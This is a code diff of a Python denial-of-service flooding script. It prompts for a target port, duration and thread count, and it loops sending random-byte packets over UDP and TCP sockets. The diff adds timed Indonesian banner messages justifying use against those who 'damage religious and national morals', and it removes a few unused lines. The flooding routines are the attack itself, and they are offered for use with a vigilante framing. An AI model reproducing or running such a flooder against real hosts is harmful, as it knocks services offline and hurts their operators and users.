@@ -70,9 +70,23 @@ port = int(input("\033[94m Target Port :\033[0m"))
 choice = str(input("\033[31m (y/n) :\033[0m"))
 times = int(input("\033[33m Time :\033[0m"))
 threads = int(input("\033[37m Threads :\033[0m"))
+
+time.sleep(5),
+print("\033[33m  ⟩⟩  SCRIPT INI... \033[0m "),
+time.sleep(5),
+print("\033[32m  ⟩⟩  HANYA BOLEH KAU GUNAKAN \033[0m "),
+time.sleep(5),
+print("\033[91m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
+time.sleep(5),
+print("\033[98m  ⟩⟩  BAKTERI YG MERUGIKAN KEHIDUPAN \033[0m "),
+time.sleep(5),
+print("\033[96m  ⟩⟩  MERUSAK MORAL AGAMA & BANGSA \033[0m "),
+time.sleep(5),
+print("\033[95m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
+time.sleep(5),
+
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -85,7 +99,6 @@ def run():
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -101,7 +114,6 @@ def run2():
 
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -117,7 +129,6 @@ def run3():
   
 def run4():
 	data = random._urandom(16)
-	i = random.choice(("[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
